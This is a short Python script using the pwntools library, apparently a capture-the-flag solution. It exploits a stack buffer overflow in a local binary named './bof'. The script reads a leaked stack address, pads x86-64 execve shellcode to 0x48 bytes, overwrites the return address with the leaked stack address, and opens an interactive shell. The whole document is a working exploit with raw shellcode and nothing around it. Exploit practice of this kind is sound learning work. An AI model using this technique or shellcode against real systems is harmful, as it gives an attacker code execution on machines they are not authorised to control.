from pwn import *
context.log_level = "debug"
context.binary = "./bof"
p = process("./bof")

p.recvuntil("(no strings attached) ")
stack = eval(p.recvuntil("\n" , drop = True))
print(hex(stack))
shellcode_x64 	=  '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
payload = shellcode_x64.ljust(0x48 , "\x00") + p64(stack)
p.sendline(payload)

p.interactive() 